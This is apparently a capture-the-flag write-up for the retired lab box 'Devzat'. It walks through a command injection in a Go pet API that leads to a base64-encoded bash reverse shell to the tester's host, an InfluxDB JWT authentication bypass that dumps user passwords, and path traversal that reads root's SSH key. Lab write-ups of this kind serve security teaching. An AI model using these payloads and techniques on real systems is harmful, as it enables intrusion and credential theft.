# Devzat

This is the write-up for the box Devzat that got retired at the 12th March 2022.
My IP address was 10.10.14.4 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.118    devzat.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/devzat.nmap 10.10.11.118
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c25ffbde32ff44bf08f5ca49d4421a06 (RSA)
|   256 bccde8ee0aa9157652bc19a4a3b2baff (ECDSA)
|_  256 62ef72524f19538bf29bbe46884bc3d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://devzat.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|_  3072 6aeedb90a610309f94ffbf61952a2063 (RSA)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.93%I=7%D=2/12%Time=63E90C2D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web service forwards to the hostname _devzat.htb_ and is a custom developed website that advertises a chat application which is accessible via SSH.
At the end of the page, it shows instructions on how to access the chat:
```
Go ahead and follow this instructions:

ssh -l [username] devzat.htb -p 8000
```

By using any username, it is possible to use the chat service.
The command _/help_ shows that is runs the open-source chat over SSH [Devzat](https://github.com/quackduck/devzat) written in **Golang**.

As the chat service does not provide any information, the web service can be checked for subdomains with **Gobuster**:
```
gobuster vhost -u http://devzat.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt > devzat_vhost.txt
```
```
grep -v 'Status: 302' devzat_vhost.txt
```

The subdomain _pets.devzat.htb_ has the HTTP status code 200 and has to be added to the _/etc/hosts_ file to access it.
On there is a list of pets and it is possible to add pets in the input field.

Searching for hidden directories with **wfuzz**:
```
wfuzz -u http://pets.devzat.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt --hh 510
```

There is a _.git_ directory, that can be downloaded with [git-dumper](https://github.com/arthaud/git-dumper):
```
git-dumper http://pets.devzat.htb/ git
```

The git repository contains the source code of the application and there is a command injection vulnerability in the file _main.go_ when adding pets to the list:
```
func loadCharacter(species string) string {
        cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
```

Sending a request and adding `sleep` command to the _species_ parameter:
```
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
(...)

{
  "name":"test1",
  "species":"cat;sleep 2"
}
```

It takes more than two seconds until the response comes back and proofs command injection which can be used to gain a reverse shell.

Base64-encoding reverse shell command:
```
echo -n 'bash  -i >& /dev/tcp/10.10.14.4/9001  0>&1' | base64
```

Sending the request with the reverse shell command:
```
POST /api/pet HTTP/1.1
(...)

{
  "name":"test1",
  "species":"cat;echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85MDAxICAwPiYx | base64 -d | bash"
}
```

After sending the request, the listener on my IP and port 9001 starts a reverse shell as the user _patrick_.

## Privilege Escalation

The user _patrick_ has a SSH key in the home folder which can be used to create a real SSH session on the box:
```
ssh -i patrick.ssh patrick@devzat.htb
```

The username can now be used to login to the chat on port 8000 on localhost:
```
ssh -l patrick -p 8000 localhost
```

There is a chat between the _admin_ and _patrick_ about **InfluxDB**:
```
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
```

The service **InfluxDB** is running on port 8086 and may contain credentials.

```
curl -v 127.0.0.1:8086
```
```
> GET / HTTP/1.1
> Host: 127.0.0.1:8086

< HTTP/1.1 404 Not Found
< X-Influxdb-Build: OSS
< X-Influxdb-Version: 1.7.5
```

When researching for vulnerabilities in **InfluxDB**, it is recommended to check the [changelog](https://docs.influxdata.com/influxdb/v1.8/about_the_project/releasenotes-changelog/#175-2019-03-26) and read changes in versions higher than 1.7.5.

In version 1.7.6 there was a vulnerability fixed, to _"ensure credentials are correctly passed when executing Flux HTTP requests in the influx CLI with the -type=flux option"_.
Looking at the [issues in GitHub](https://github.com/influxdata/influxdb/issues/12927) around the same time, there is a report of a **Authentication Bypass** vulnerability.

We need to create a **JSON Web Token** with an empty secret as described in the issue.
The website [jwt.io](https://jwt.io/) can be used to generate a **JWT**:

![Generating token on jwt.io](devzat_jwt-1.png)

Using the example query from the [InfluxDB API documentation](https://docs.influxdata.com/influxdb/v1.7/guides/querying_data/):
```
curl -G 'http://localhost:8086/query?pretty=true' --data-urlencode "db=mydb" --data-urlencode "q=SELECT \"value\" FROM \"cpu_load_short\" WHERE \"region\"='us-west'" -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc3MjI3MTk4fQ.FRTcj7HZRXF5CvZwCF5O9uwR6K-PQBS_JbgC4JgPKto'
```
```
{
    "results": [
        {
            "statement_id": 0,
            "error": "database not found: mydb"
        }
    ]
}
```

The authorization worked and can be used to enumerate the databases:
```
curl -G 'http://localhost:8086/query?pretty=true' --data-urlencode "q=show databases" -H (...)
```

Getting tables of the database _devzat_:
```
curl -G 'http://localhost:8086/query?pretty=true' --data-urlencode "db=devzat" --data-urlencode "q=show measurements" -H (...)
```

Getting values of the table _user_:
```
curl -G 'http://localhost:8086/query?pretty=true' --data-urlencode "db=devzat" --data-urlencode 'q=select * from "user"' -H (...)
```

There are two credentials of users that are enabled:
```
catherine:woBeeYareedahc7Oogeephies7Aiseci

charles:RoyalQueenBee$
```

As _catherine_ exists on the box, the password can be tried to switch users:
```
su - catherine
```

### Privilege Escalation to root

When reading the messages of _catherine_ in the chat service, there is a chat with _patrick_ that mentions a service on port 8443:
```
ssh -l catherine -p 8000 localhost
```
```
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now
patrick: That's perfectly fine. You'll need a password which you can gather from the source. I left it in our default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
```

This is another SSH service that looks like the chat application from before:
```
ssh -l catherine -p 8443 127.0.0.1
```

When comparing the _commands_ in both applications, this one has a _/file_ command to paste files to the chat:
```
[SYSTEM] file - Paste a files content directly to chat [alpha]

catherine: /file
[SYSTEM] Please provide file to print and the password
catherine: /file /etc/passwd
[SYSTEM] You need to provide the correct password to use this function
catherine: /file /etc/passwd Pass123
[SYSTEM] You did provide the wrong password
```

This feature needs a password that is in some backup location.

Searching for files that are owned by _catherine_:
```
find / -user catherine -ls 2>/dev/null | grep -v proc
```

The files _/var/backups/devzat-main.zip_ and _/var/backups/devzat-dev.zip_ are the backup files and can be downloaded to look for differences.
```
unzip devzat-main.zip
unzip devzat-dev.zip
```

Creating a list of all MD5 hashes:
```
find . -type f -exec md5sum {} \; | awk '{print $1}' > md5.list
```

Sorting unique MD5 hashes:
```
sort md5.list | uniq -c | grep ' 1 ' | awk '{print $2}' > unique_md5.list
```

Comparing the unique MD5 hashes to each other:
```
find . -type f -exec md5sum {} \; | grep -f unique_md5.list
```

The files _allusers.json_, _commands.go_ and _devchat.go_ differ each other in both directories.

By comparing the _commands.go_ files, the code of the new feature can be found:
```
diff dev/commands.go main/commands.go
```

In there is a hard-coded password:
```
(...)
// Check my secure password
       if pass != "CeilingCatStillAThingIn2021?" {
               u.system("You did provide the wrong password")
(...)
```

Using the _file_ feature in the chat on port 8443:
```
catherine: /file /etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/etc/passwd does not exist!
```

The feature reads files from the directory of root, so the private SSH key of root can be copied:
```
catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
```

With this SSH key it is possible to login via SSH as root!
```
ssh -i root.key root@devzat.htb
```
